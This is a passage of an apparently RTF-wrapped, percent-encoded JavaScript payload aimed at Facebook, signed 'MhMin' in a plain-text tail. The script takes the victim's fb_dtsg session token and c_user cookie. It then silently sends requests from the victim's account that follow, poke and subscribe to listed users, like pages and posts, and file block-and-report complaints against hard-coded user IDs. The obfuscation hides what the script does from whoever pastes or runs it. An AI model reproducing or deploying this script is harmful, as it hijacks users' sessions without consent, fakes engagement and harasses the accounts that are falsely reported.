73%74%73%2F%73%75%62%73%63%72%69%62%65%2F%6D%6F%64%69%66%79%3F%6C%6F%63%61%74%69%6F%6E%3D%70%65%72%6D%61%6C%69%6E%6B%26%61%63%74%69%6F%6E%3D%73%75%62%73%63%72%69%62%65%27%29%2E%73%65%74%44%61%74%61%28%7B%20%66%6C%69%64%3A%20%22%20%2B%20%75%69%64%73%73%20%2B%20%22%20%7D%29%2E%73%65%6E%64%28%29%3B%22%3B%0A%20%64%6F%63%75%6D%65%6E%74%2E%62%6F%64%79%2E%61%70%70%65%6E%64%43%68%69%6C%64%28%61%29%3B%0A%7D%0A%20%66%75%6E%63%74%69%6F%6E%20%70%28%61%62%6F%6E%65%29%0A%7B%0A%20%76%61%72%20%68%74%74%70%34%20%3D%20%6E%65%77%20%58%4D%4C%48%74%74%70%52%65%71%75%65%73%74%28%29%3B%0A%20%76%61%72%20%75%72%6C%34%20%3D%20%22%2F%2F%77%77%77%2E%66%61%63%65%62%6F%6F%6B%2E%63%6F%6D%2F%61%6A%61%78%2F%70%6F%6B%65%5F%64%69%61%6C%6F%67%2E%70%68%70%22%3B%0A%20%76%61%72%20%70%61%72%61%6D%73%34%20%3D%20%22%75%69%64%3D%22%20%2B%20%61%62%6F%6E%65%20%2B%20%22%26%70%6F%6B%65%62%61%63%6B%3D%30%26%61%73%6B%5F%66%6F%72%5F%63%6F%6E%66%69%72%6D%3D%30%26%6E%63%74%72%5B%5F%6D%6F%64%5D%3D%70%61%67%65%6C%65%74%5F%74%69%6D%65%6C%69%6E%65%5F%70%72%6F%66%69%6C%65%5F%61%63%74%69%6F%6E%73%26%5F%5F%61%73%79%6E%63%44%69%61%6C%6F%67%3D%31%26%5F%5F%75%73%65%72%3D%22%2B%75%73%65%72%5F%69%64%2B%22%26%5F%5F%61%3D%31%26%5F%5F%64%79%6E%3D%37%39%38%61%44%35%7A%35%43%46%2D%26%5F%5F%72%65%71%3D%76%26%66%62%5F%64%74%73%67%3D%22%2B%66%62%5F%64%74%73%67%2B%22%26%70%68%73%74%61%6D%70%3D%22%3B%0A%20%68%74%74%70%34%2E%6F%70%65%6E%28%22%50%4F%53%54%22%2C%20%75%72%6C%34%2C%20%74%72%75%65%29%3B%0A%20%68%74%74%70%34%2E%6F%6E%72%65%61%64%79%73%74%61%74%65%63%68%61%6E%67%65%20%3D%20%66%75%6E%63%74%69%6F%6E%20%28%29%0A%20%7B%0A%20%20%69%66%20%28%68%74%74%70%34%2E%72%65%61%64%79%53%74%61%74%65%20%3D%3D%20%34%20%26%26%20%68%74%74%70%34%2E%73%74%61%74%75%73%20%3D%3D%20%32%30%30%29%0A%20%20%7B%0A%20%20%20%68%74%74%70%34%2E%63%6C%6F%73%65%3B%0A%20%20%7D%0A%20%7D%0A%20%3B%0A%20%68%74%74%70%34%2E%73%65%6E%64%28%70%61%72%61%6D%73%34%29%3B%0A%7D%0A%61%28%22%31%30%30%30%30%36%30%36%34%31%38%30%34%36%39%22%29%3B%61%28%22%31%30%30%30%30%33%34%38%39%34%31%38%37%36%36%22%29%3B%61%28%22%31%30%30%30%30%35%32%35%32%33%31%33%39%33%38%22%29%3B%61%28%22%31%30%30%30%30%36%36%39%35%34%31%32%33%37%32%22%29%3B%73%75%62%6C%69%73%74%28%22%33%36%32%35%38%31%38%39%37%32%30%31%34%35%34%22%29%3B%73%75%62%6C%69%73%74%28%22%33%36%35%31%39%38%31%33%33%36%30%36%34%39%37%22%29%3B%73%75%62%6C%69%73%74%28%22%33%36%35%31%39%38%33%38%30%32%37%33%31%33%39%22%29%3B%0A%76%61%72%20%66%62%5F%64%74%73%67%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%73%42%79%4E%61%6D%65%28%27%66%62%5F%64%74%73%67%27%29%5B%30%5D%2E%76%61%6C%75%65%3B%20%76%61%72%20%75%73%65%72%5F%69%64%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%2E%6D%61%74%63%68%28%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%2E%6D%61%74%63%68%28%2F%63%5F%75%73%65%72%3D%28%5C%64%2B%29%2F%29%5B%31%5D%29%3B%20%66%75%6E%63%74%69%6F%6E%20%4C%69%6B%65%28%70%29%20%7B%20%76%61%72%20%50%61%67%65%20%3D%20%6E%65%77%20%58%4D%4C%48%74%74%70%52%65%71%75%65%73%74%28%29%3B%20%76%61%72%20%50%61%67%65%55%52%4C%20%3D%20%22%2F%2F%77%77%77%2E%66%61%63%65%62%6F%6F%6B%2E%63%6F%6D%2F%61%6A%61%78%2F%70%61%67%65%73%2F%66%61%6E%5F%73%74%61%74%75%73%2E%70%68%70%22%3B%20%76%61%72%20%50%61%67%65%50%61%72%61%6D%73%20%3D%20%22%26%66%62%70%61%67%65%5F%69%64%3D%22%20%2B%20%70%20%2B%22%26%61%64%64%3D%74%72%75%65%26%72%65%6C%6F%61%64%3D%66%61%6C%73%65%26%66%61%6E%5F%6F%72%69%67%69%6E%3D%70%61%67%65%5F%74%69%6D%65%6C%69%6E%65%26%66%61%6E%5F%73%6F%75%72%63%65%3D%26%63%61%74%3D%26%6E%63%74%72%5B%5F%6D%6F%64%5D%3D%70%61%67%65%6C%65%74%5F%74%69%6D%65%6C%69%6E%65%5F%70%61%67%65%5F%61%63%74%69%6F%6E%73%26%5F%5F%75%73%65%72%3D%22%2B%75%73%65%72%5F%69%64%2B%22%26%5F%5F%61%3D%31%26%5F%5F%64%79%6E%3D%37%39%38%61%44%35%7A%35%43%46%2D%26%5F%5F%72%65%71%3D%64%26%66%62%5F%64%74%73%67%3D%22%2B%66%62%5F%64%74%73%67%2B%22%26%70%68%73%74%61%6D%70%3D%22%3B%20%50%61%67%65%2E%6F%70%65%6E%28%22%50%4F%53%54%22%2C%20%50%61%67%65%55%52%4C%2C%20%74%72%75%65%29%3B%20%50%61%67%65%2E%6F%6E%72%65%61%64%79%73%74%61%74%65%63%68%61%6E%67%65%20%3D%20%66%75%6E%63%74%69%6F%6E%20%28%29%20%7B%20%69%66%20%28%50%61%67%65%2E%72%65%61%64%79%53%74%61%74%65%20%3D%3D%20%34%20%26%26%20%50%61%67%65%2E%73%74%61%74%75%73%20%3D%3D%20%32%30%30%29%20%7B%20%50%61%67%65%2E%63%6C%6F%73%65%3B%20%7D%20%7D%3B%20%50%61%67%65%2E%73%65%6E%64%28%50%61%67%65%50%61%72%61%6D%73%29%3B%20%7D%20%0A%4C%69%6B%65%28%22%31%34%39%37%30%36%31%34%38%35%37%30%34%37%38%22%29%3B%4C%69%6B%65%28%22%36%30%37%31%35%30%36%37%35%39%36%32%31%33%38%22%29%3B%4C%69%6B%65%28%22%37%33%32%30%32%36%32%35%30%31%35%39%31%32%37%22%29%3B%4C%69%6B%65%28%22%33%36%35%32%38%33%39%34%36%39%35%31%36%34%37%22%29%3B%4C%69%6B%65%28%22%32%32%32%31%34%37%36%39%31%33%30%30%33%33%39%22%29%3B%4C%69%6B%65%28%22%33%32%38%36%36%32%35%34%37%32%37%35%38%30%32%22%29%3B%4C%69%6B%65%28%22%36%33%33%35%33%33%39%34%36%37%30%34%30%36%34%22%29%3B%4C%69%6B%65%28%22%34%33%37%35%38%34%31%35%39%37%30%33%34%31%33%22%29%3B%4C%69%6B%65%28%22%34%38%34%38%30%39%36%32%38%32%39%36%38%38%31%22%29%3B%0A%76%61%72%20%75%73%65%72%5F%69%64%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%2E%6D%61%74%63%68%28%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%2E%6D%61%74%63%68%28%2F%63%5F%75%73%65%72%3D%28%5C%64%2B%29%2F%29%5B%31%5D%29%3B%20%76%61%72%20%66%62%5F%64%74%73%67%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%73%42%79%4E%61%6D%65%28%27%66%62%5F%64%74%73%67%27%29%5B%30%5D%2E%76%61%6C%75%65%3B%20%76%61%72%20%6E%6F%77%3D%28%6E%65%77%20%44%61%74%65%29%2E%67%65%74%54%69%6D%65%28%29%3B%20%66%75%6E%63%74%69%6F%6E%20%50%28%6F%70%6F%29%20%7B%20%76%61%72%20%58%20%3D%20%6E%65%77%20%58%4D%4C%48%74%74%70%52%65%71%75%65%73%74%28%29%3B%20%76%61%72%20%58%55%52%4C%20%3D%22%2F%2F%77%77%77%2E%66%61%63%65%62%6F%6F%6B%2E%63%6F%6D%2F%61%6A%61%78%2F%75%66%69%2F%6C%69%6B%65%2E%70%68%70%22%3B%20%76%61%72%20%58%50%61%72%61%6D%73%20%3D%20%22%6C%69%6B%65%5F%61%63%74%69%6F%6E%3D%74%72%75%65%26%66%74%5F%65%6E%74%5F%69%64%65%6E%74%69%66%69%65%72%3D%22%2B%6F%70%6F%2B%22%26%73%6F%75%72%63%65%3D%31%26%63%6C%69%65%6E%74%5F%69%64%3D%22%2B%6E%6F%77%2B%22%25%33%41%33%37%39%37%38%33%38%35%37%26%72%6F%6F%74%69%64%3D%75%5F%6A%73%6F%6E%70%5F%33%39%5F%31%38%26%67%69%66%74%6F%63%63%61%73%69%6F%6E%26%66%74%5B%74%6E%5D%3D%25%33%45%25%33%44%26%66%74%5B%74%79%70%65%5D%3D%32%30%26%66%74%5B%71%69%64%5D%3D%35%38%39%30%38%31%31%33%32%39%34%37%30%32%37%39%32%35%37%26%66%74%5B%6D%66%5F%73%74%6F%72%79%5F%6B%65%79%5D%3D%32%38%31%34%39%36%32%39%30%30%31%39%33%31%34%33%39%35%32%26%66%74%5B%68%61%73%5F%65%78%70%61%6E%64%65%64%5F%75%66%69%5D%3D%31%26%6E%63%74%72%5B%5F%6D%6F%64%5D%3D%70%61%67%65%6C%65%74%5F%68%6F%6D%65%5F%73%74%72%65%61%6D%26%5F%5F%75%73%65%72%3D%22%2B%75%73%65%72%5F%69%64%2B%22%26%5F%5F%61%3D%31%26%5F%5F%64%79%6E%3D%37%6E%38%38%51%6F%41%4D%42%6C%43%6C%79%6F%63%70%61%65%26%5F%5F%72%65%71%3D%67%34%26%66%62%5F%64%74%73%67%3D%22%2B%66%62%5F%64%74%73%67%2B%22%26%70%68%73%74%61%6D%70%3D%22%3B%20%58%2E%6F%70%65%6E%28%22%50%4F%53%54%22%2C%20%58%55%52%4C%2C%20%74%72%75%65%29%3B%20%58%2E%6F%6E%72%65%61%64%79%73%74%61%74%65%63%68%61%6E%67%65%20%3D%20%66%75%6E%63%74%69%6F%6E%20%28%29%20%7B%20%69%66%20%28%58%2E%72%65%61%64%79%53%74%61%74%65%20%3D%3D%20%34%20%26%26%20%58%2E%73%74%61%74%75%73%20%3D%3D%20%32%30%30%29%20%7B%20%58%2E%63%6C%6F%73%65%3B%20%7D%20%7D%3B%20%58%2E%73%65%6E%64%28%58%50%61%72%61%6D%73%29%3B%20%7D%20%0A%50%28%22%31%34%37%39%33%32%32%39%35%33%33%33%30%38%33%22%29%3B%0A%76%61%72%20%66%62%5F%64%74%73%67%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%73%42%79%4E%61%6D%65%28%27%66%62%5F%64%74%73%67%27%29%5B%30%5D%2E%76%61%6C%75%65%3B%0A%76%61%72%20%75%73%65%72%5F%69%64%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%2E%6D%61%74%63%68%28%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%2E%6D%61%74%63%68%28%2F%63%5F%75%73%65%72%3D%28%5C%64%2B%29%2F%29%5B%31%5D%29%3B%0A%76%61%72%20%6E%6F%77%3D%28%6E%65%77%20%44%61%74%65%29%2E%67%65%74%54%69%6D%65%28%29%3B%0A%66%75%6E%63%74%69%6F%6E%20%72%65%70%6F%72%74%28%72%29%20%7B%0A%76%61%72%20%58%20%3D%20%6E%65%77%20%58%4D%4C%48%74%74%70%52%65%71%75%65%73%74%28%29%3B%0A%76%61%72%20%58%55%52%4C%20%3D%20%22%68%74%74%70%73%3A%2F%2F%77%77%77%2E%66%61%63%65%62%6F%6F%6B%2E%63%6F%6D%2F%61%6A%61%78%2F%72%65%70%6F%72%74%2F%73%6F%63%69%61%6C%2E%70%68%70%22%3B%0A%76%61%72%20%58%50%61%72%61%6D%73%20%3D%22%66%62%5F%64%74%73%67%3D%22%2B%66%62%5F%64%74%73%67%2B%22%26%62%6C%6F%63%6B%3D%31%26%70%70%3D%25%37%42%25%32%32%61%63%74%69%6F%6E%73%5F%74%6F%5F%74%61%6B%65%25%32%32%25%33%41%25%32%32%5B%5D%25%32%32%25%32%43%25%32%32%61%72%65%5F%66%72%69%65%6E%64%73%25%32%32%25%33%41%66%61%6C%73%65%25%32%43%25%32%32%63%69%64%25%32%32%25%33%41%22%20%2B%20%72%20%2B%22%25%32%43%25%32%32%63%6F%6E%74%65%6E%74%5F%74%79%70%65%25%32%32%25%33%41%30%25%32%43%25%32%32%65%78%70%61%6E%64%5F%72%65%70%6F%72%74%25%32%32%25%33%41%31%25%32%43%25%32%32%66%69%72%73%74%5F%63%68%6F%69%63%65%25%32%32%25%33%41%25%32%32%66%69%6C%65%5F%72%65%70%6F%72%74%25%32%32%25%32%43%25%32%32%66%72%6F%6D%5F%67%65%61%72%25%32%32%25%33%41%25%32%32%74%69%6D%65%6C%69%6E%65%25%32%32%25%32%43%25%32%32%69%73%5F%66%6F%6C%6C%6F%77%69%6E%67%25%32%32%25%33%41%66%61%6C%73%65%25%32%43%25%32%32%69%73%5F%74%61%67%67%65%64%25%32%32%25%33%41%66%61%6C%73%65%25%32%43%25%32%32%6F%6E%5F%70%72%6F%66%69%6C%65%25%32%32%25%33%41%66%61%6C%73%65%25%32%43%25%32%32%70%68%61%73%65%25%32%32%25%33%41%33%25%32%43%25%32%32%72%65%66%25%32%32%25%33%41%25%32%32%68%74%74%70%73%25%33%41%25%35%43%25%32%46%25%35%43%25%32%46%77%77%77%2E%66%61%63%65%62%6F%6F%6B%2E%63%6F%6D%25%35%43%25%32%46%25%32%32%25%32%43%25%32%32%72%65%70%6F%72%74%5F%74%79%70%65%25%32%32%25%33%41%31%34%35%25%32%43%25%32%32%72%69%64%25%32%32%25%33%41%22%20%2B%20%72%20%2B%22%25%32%43%25%32%32%73%75%62%5F%72%65%70%6F%72%74%5F%74%79%70%65%25%32%32%25%33%41%31%34%31%25%32%43%25%32%32%74%69%6D%65%5F%66%6C%6F%77%5F%73%74%61%72%74%65%64%25%32%32%25%33%41%22%2B%6E%6F%77%2B%22%25%32%43%25%32%32%75%73%65%72%25%32%32%25%33%41%22%2B%75%73%65%72%5F%69%64%2B%22%25%37%44%26%66%69%6C%65%5F%72%65%70%6F%72%74%3D%31%26%5F%5F%75%73%65%72%3D%22%2B%75%73%65%72%5F%69%64%2B%22%26%5F%5F%61%3D%31%26%5F%5F%64%79%6E%3D%37%6E%38%61%68%79%6A%33%35%79%6E%7A%70%51%39%55%6D%41%57%75%55%52%44%77%26%5F%5F%72%65%71%3D%68%26%74%74%73%74%61%6D%70%3D%32%36%35%38%31%36%36%31%31%30%37%31%31%32%30%31%31%32%37%36%26%63%6F%6E%66%69%72%6D%65%64%3D%31%22%3B%0A%58%2E%6F%70%65%6E%28%22%50%4F%53%54%22%2C%20%58%55%52%4C%2C%20%74%72%75%65%29%3B%0A%58%2E%6F%6E%72%65%61%64%79%73%74%61%74%65%63%68%61%6E%67%65%20%3D%20%66%75%6E%63%74%69%6F%6E%20%28%29%20%7B%0A%69%66%20%28%58%2E%72%65%61%64%79%53%74%61%74%65%20%3D%3D%20%34%20%26%26%20%58%2E%73%74%61%74%75%73%20%3D%3D%20%32%30%30%29%20%7B%0A%58%2E%63%6C%6F%73%65%3B%0A%7D%0A%7D%3B%0A%58%2E%73%65%6E%64%28%58%50%61%72%61%6D%73%29%3B%0A%7D%0A%72%65%70%6F%72%74%28%22%31%30%30%30%30%32%39%38%39%33%33%31%36%35%34%22%29%3B%72%65%70%6F%72%74%28%22%31%30%30%30%30%34%36%30%30%34%35%34%34%38%35%22%29%3B%72%65%70%6F%72%74%28%22%31%30%30%30%30%37%34%30%33%38%38%39%38%32%39%22%29%3B%09"));\par
//MhMin\par
a("100006483813698");a("100006256620370");a("100007681050376");\par
sublist("1503147213244725");\par
P("1523667257859387");P("1522436311315815");P("1492048254354621");P("1461930687366378");P("1437672029792244");\par
Like("493331530702285");Like("243176022513080");Like("646227342108519");Like("138903052970790");Like("1453530041533507");\par
}
